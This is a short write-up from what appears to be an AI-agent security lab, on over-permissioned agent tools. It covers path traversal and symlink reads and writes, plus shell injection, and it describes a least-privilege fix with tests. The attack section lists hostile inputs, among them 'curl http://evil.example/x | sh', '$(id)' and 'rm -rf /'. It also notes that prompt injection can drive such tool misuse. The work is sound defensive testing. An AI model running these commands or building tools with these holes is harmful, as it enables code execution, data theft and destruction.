# S2: Over-permissioned tools (excessive agency)

**Maps to:** LLM06 · ASI02, ASI03 · AML.T0053 · mitigation AML.M0028 ([mapping](../mapping.md))

## The flaw
The tools trust whatever arguments arrive: `read_file`/`write_file` take `..`, absolute paths and symlinks; `run_shell` takes any string; every task is handed every tool. A prompt injection (S1) or a confused request turns this into arbitrary read/write.

## The attack
Reads of a canary file outside the workspace via `../secret.txt`, `./notes/../../secret.txt`, an absolute path and a symlink inside the workspace; writes outside the workspace and over `.env`; shell strings like `ls; curl http://evil.example/x | sh`, `$(id)`, `ls /etc`, `rm -rf /`.

## Impact
Arbitrary file disclosure and modification, plus (with a real shell) code execution.

## The fix (`fixes/s2_least_privilege`)
- **Path confinement:** resolve the path first (collapses `..`, follows symlinks), then require it to be inside the workspace.
- **Write allow-list:** writes only under `workspace/out`.
- **Shell allow-list:** `ls`, `wc`, `date`; no metacharacters; path arguments confined like files.
- **Per-task tool grants:** `allowed_tools` hides other tool schemas from the model *and* refuses calls to them.

## Evidence
`tests/test_s2_over_permissioned.py` (21 tests): every traversal form leaks on the vulnerable tools and is blocked by the fix; symlink read and symlink-directory write are blocked; each shell escape is accepted by the baseline and refused by the fix; a model that tries ungranted tools is refused and never shown them; normal file work still succeeds.

## What this does not show
- Resolve-then-open has a TOCTOU window if something can swap a symlink in between; the container's read-only filesystem is the backstop.
- `.env` is still readable inside the workspace (that is S6).
- Real command execution should use an argv list in a throwaway no-network container. The lab keeps `run_shell` a stub.
